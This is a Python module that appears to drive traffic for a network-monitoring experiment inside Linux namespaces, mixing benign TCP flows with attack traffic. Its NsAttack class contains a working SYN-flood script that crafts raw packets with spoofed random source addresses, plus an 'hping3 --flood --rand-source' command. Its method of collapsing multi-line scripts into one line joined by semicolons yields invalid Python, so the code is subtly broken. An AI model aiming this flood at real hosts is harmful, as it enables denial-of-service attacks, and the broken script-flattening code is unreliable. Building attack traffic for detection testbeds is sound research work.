"""
traffic/ns_traffic.py
Traffic generators that run inside Linux network namespaces.
Uses netcat / Python sockets — no iperf3 or hping3 required.
"""

import os
import time
import signal
import logging
import random
import threading
import subprocess
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


def _bg(ns: str, cmd: str) -> subprocess.Popen:
    """Run cmd inside namespace in background, return Popen."""
    return subprocess.Popen(
        f"ip netns exec {ns} {cmd}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )


def _kill(proc: subprocess.Popen) -> None:
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=3)
        except Exception:
            pass


# --------------------------------------------------------------------------
# Normal traffic — TCP flows via Python socket inside namespace
# --------------------------------------------------------------------------

class NsFlow:
    """
    A TCP flow between two namespaces implemented with Python sockets.
    Sender script runs inside src namespace via ip netns exec python3.
    Listener script runs inside dst namespace.
    """

    SENDER_SCRIPT = """
import socket, time, random, sys
dst_ip   = '{dst_ip}'
dst_port = {dst_port}
duration = {duration}
end_time = time.time() + duration
payload  = bytes(random.randint(64, 1400))
sent     = 0
while time.time() < end_time:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((dst_ip, dst_port))
        burst = random.randint(5, 50)
        for _ in range(burst):
            s.sendall(payload)
            sent += len(payload)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(0.01, 0.1))
"""

    LISTENER_SCRIPT = """
import socket, threading
port = {port}
def handle(conn):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
    except Exception:
        pass
    finally:
        conn.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', port))
s.listen(20)
s.settimeout(300)
while True:
    try:
        conn, _ = s.accept()
        threading.Thread(target=handle, args=(conn,), daemon=True).start()
    except Exception:
        break
"""

    def __init__(
        self,
        src_ns  : str,
        dst_ns  : str,
        dst_ip  : str,
        port    : int,
        duration: int,
    ):
        self.src_ns   = src_ns
        self.dst_ns   = dst_ns
        self.dst_ip   = dst_ip
        self.port     = port
        self.duration = duration
        self._listener : Optional[subprocess.Popen] = None
        self._sender   : Optional[subprocess.Popen] = None

    def start(self) -> None:
        # Start listener in dst namespace
        ls = self.LISTENER_SCRIPT.format(port=self.port)
        ls_oneline = "; ".join(
            line.strip() for line in ls.strip().splitlines() if line.strip()
        )
        self._listener = _bg(self.dst_ns, f"python3 -c \"{ls_oneline}\"")
        time.sleep(0.3)   # give listener time to bind

        # Start sender in src namespace
        ss = self.SENDER_SCRIPT.format(
            dst_ip   = self.dst_ip,
            dst_port = self.port,
            duration = self.duration,
        )
        ss_oneline = "; ".join(
            line.strip() for line in ss.strip().splitlines() if line.strip()
        )
        self._sender = _bg(self.src_ns, f"python3 -c \"{ss_oneline}\"")

    def stop(self) -> None:
        _kill(self._sender)
        _kill(self._listener)


# --------------------------------------------------------------------------
# Attack traffic — SYN flood via Python raw socket inside namespace
# --------------------------------------------------------------------------

class NsAttack:
    """
    SYN flood using Python raw sockets inside a namespace.
    Tries hping3 first, falls back to Python raw socket implementation.
    """

    SYNFLOOD_SCRIPT = """
import socket, struct, random, time, os

def cksum(data):
    if len(data) % 2:
        data += b'\\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def syn_packet(dst_ip, dst_port):
    src_ip   = '.'.join(str(random.randint(1,254)) for _ in range(4))
    sport    = random.randint(1024, 65535)
    seq      = random.randint(0, 2**32-1)
    ip_hdr   = struct.pack('!BBHHHBBH4s4s',
                   0x45, 0, 40, random.randint(0,65535), 0,
                   64, 6, 0,
                   socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    tcp_hdr  = struct.pack('!HHLLBBHHH',
                   sport, dst_port, seq, 0,
                   0x50, 0x02, 65535, 0, 0)
    pseudo   = struct.pack('!4s4sBBH',
                   socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
                   0, 6, len(tcp_hdr))
    tcp_cs   = cksum(pseudo + tcp_hdr)
    tcp_hdr  = tcp_hdr[:16] + struct.pack('!H', tcp_cs) + tcp_hdr[18:]
    ip_cs    = cksum(ip_hdr)
    ip_hdr   = ip_hdr[:10] + struct.pack('!H', ip_cs) + ip_hdr[12:]
    return ip_hdr + tcp_hdr, dst_ip

dst_ip   = '{dst_ip}'
dst_port = {dst_port}
duration = {duration}
end_time = time.time() + duration

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while time.time() < end_time:
        pkt, dst = syn_packet(dst_ip, dst_port)
        try:
            s.sendto(pkt, (dst, 0))
        except Exception:
            pass
except PermissionError:
    # Fallback: rapid TCP connect attempts
    end_time2 = time.time() + {duration}
    while time.time() < end_time2:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((dst_ip, dst_port))
            s.close()
        except Exception:
            pass
"""

    def __init__(
        self,
        src_ns     : str,
        dst_ip     : str,
        dst_port   : int = 80,
        duration   : int = 60,
        rate       : int = 1000,
    ):
        self.src_ns   = src_ns
        self.dst_ip   = dst_ip
        self.dst_port = dst_port
        self.duration = duration
        self.rate     = rate
        self._proc    : Optional[subprocess.Popen] = None

    def start(self) -> None:
        # Try hping3 first
        rc, _, _ = _run_local(f"ip netns exec {self.src_ns} which hping3")
        if rc == 0:
            count = self.rate * self.duration
            cmd = (
                f"hping3 -S --flood -p {self.dst_port} "
                f"--rand-source --count {count} {self.dst_ip}"
            )
            self._proc = _bg(self.src_ns, cmd)
            logger.info(
                f"Attack: hping3 SYN flood "
                f"{self.dst_ip}:{self.dst_port} for {self.duration}s"
            )
            return

        # Fall back to Python raw socket
        script = self.SYNFLOOD_SCRIPT.format(
            dst_ip   = self.dst_ip,
            dst_port = self.dst_port,
            duration = self.duration,
        )
        oneline = "; ".join(
            line.strip() for line in script.strip().splitlines()
            if line.strip()
        )
        self._proc = _bg(self.src_ns, f"python3 -c \"{oneline}\"")
        logger.info(
            f"Attack: Python SYN flood "
            f"{self.dst_ip}:{self.dst_port} for {self.duration}s"
        )

    def stop(self) -> None:
        _kill(self._proc)


def _run_local(cmd: str) -> tuple:
    r = subprocess.run(cmd, shell=True, capture_output=True)
    return r.returncode, r.stdout, r.stderr


# --------------------------------------------------------------------------
# Traffic manager — orchestrates all flows for one experiment run
# --------------------------------------------------------------------------

class NsTrafficManager:

    def __init__(self, host_info: Dict):
        """
        host_info: {hostname: {ns: str, ip: str}}
        e.g. {"h1": {"ns": "adaptmon_h1", "ip": "10.0.1.1"}, ...}
        """
        self.hosts    = host_info
        self._flows   : List[NsFlow]   = []
        self._attacks : List[NsAttack] = []

    def _ns(self, host: str) -> str:
        return self.hosts[host]["ns"]

    def _ip(self, host: str) -> str:
        return self.hosts[host]["ip"]

    def start_normal_traffic(self, duration: int = 120) -> None:
        """Start normal TCP flows between all host pairs."""
        # 4 flows covering both intra and cross-switch paths
        flows_def = [
            ("h1", "h2", "10.0.1.2", 5001),   # same switch
            ("h3", "h4", "10.0.2.2", 5002),   # same switch
            ("h1", "h3", "10.0.2.1", 5003),   # cross switch
            ("h2", "h4", "10.0.2.2", 5004),   # cross switch
        ]
        for src, dst, dst_ip, port in flows_def:
            if src not in self.hosts or dst not in self.hosts:
                continue
            flow = NsFlow(
                src_ns   = self._ns(src),
                dst_ns   = self._ns(dst),
                dst_ip   = dst_ip,
                port     = port,
                duration = duration,
            )
            flow.start()
            self._flows.append(flow)
            time.sleep(0.1)

        logger.info(f"Started {len(self._flows)} normal TCP flows")

    def start_attack(
        self,
        src_host  : str = "h1",
        target_ip : str = "10.0.2.1",
        duration  : int = 60,
        rate      : int = 5000,
    ) -> None:
        """Start SYN flood from src_host toward target_ip."""
        if src_host not in self.hosts:
            logger.error(f"Unknown host: {src_host}")
            return

        attack = NsAttack(
            src_ns   = self._ns(src_host),
            dst_ip   = target_ip,
            dst_port = 80,
            duration = duration,
            rate     = rate,
        )
        attack.start()
        self._attacks.append(attack)

    def stop_all(self) -> None:
        for f in self._flows:
            f.stop()
        for a in self._attacks:
            a.stop()
        self._flows.clear()
        self._attacks.clear()
        logger.info("All traffic stopped")
